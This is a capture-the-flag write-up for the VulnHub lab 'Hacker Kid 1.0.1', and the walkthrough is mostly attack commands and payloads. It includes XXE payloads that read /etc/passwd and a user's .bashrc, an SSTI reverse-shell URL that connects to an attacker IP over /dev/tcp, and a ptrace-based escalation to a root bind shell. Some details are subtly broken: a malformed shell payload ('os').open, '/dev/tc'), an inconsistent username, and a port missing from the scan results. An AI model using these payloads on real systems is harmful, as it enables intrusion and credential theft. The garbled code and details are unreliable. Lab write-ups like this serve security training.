# Hacker Kid 1.0.1 – Writeup

**Machine:** VulnHub  
**Level:** Medium  
**Link:** [Hacker Kid 1.0.1](https://www.vulnhub.com/entry/hacker-kid-101,719/)  

---

## 📌 Table of Contents

1. [Reconnaissance](#reconnaissance)  
2. [Zone Transfer and Virtual Hosts](#zone-transfer-and-virtual-hosts)  
3. [XXE Injection](#xxe-injection)  
4. [Password Discovery](#password-discovery)  
5. [SSTI and Reverse Shell](#ssti-and-reverse-shell)  
6. [Privilege Escalation](#privilege-escalation)  

---

## 🔍 Reconnaissance

nmap -sC -sV -p- 192.168.31.150

Result:

PORT   STATE SERVICE VERSION
53/tcp open  domain  ISC BIND 9.16.1
80/tcp open  http    Apache httpd 2.4.38

## 🌐 Zone Transfer

dig @192.168.31.150 AXFR blackhat.local

Result:

hackerkid.blackhat.local. 604800 IN A 192.168.31.150

Added to /etc/hosts:

echo "192.168.31.150 hackerkid.blackhat.local" >> /etc/hosts

## 💉 XXE Injection

On hackerkid.blackhat.local found a registration form sending XML to process.php.

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>

Result:

saket:x:1000:1000:Saket,,,:/home/saket:/bin/bash

Found user sakat with UID 1000.
## 🔑 Password Discovery

Read /home/saket/.bashrc via XXE:

<!ENTITY xxe SYSTEM "file:///home/saket/.bashrc">

Result:

username="admin"
password="Saket!#$%@!!"

## 🔥 SSTI and Reverse Shell

Logged in on port 9999 with found credentials:

Username: saket
Password: Saket!#$%@!!

Found SSTI in parameter name:

http://192.168.31.150:9999/?name={{7*7}}

Response: Hello 49

Reverse Shell via SSTI:

http://192.168.31.150:9999/?name={%7B__import__('os').open('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftc%2F192.168.31.209%2F4444%200%3E%261%22').read()%7D%7D

## 👑 Privilege Escalation

Check capabilities:

/usr/sbin/getcap -r / 2>/dev/null

Result:

/usr/bin/python2.7 = cap_sys_ptrace+ep

Used Python with cap_sys_ptrace to inject into a root process.

Created exploit for bind shell on port 5600.

Connect:

nc 127.0.0.1 5600
id
# uid=0(root) gid=0(root) groups=0(root)
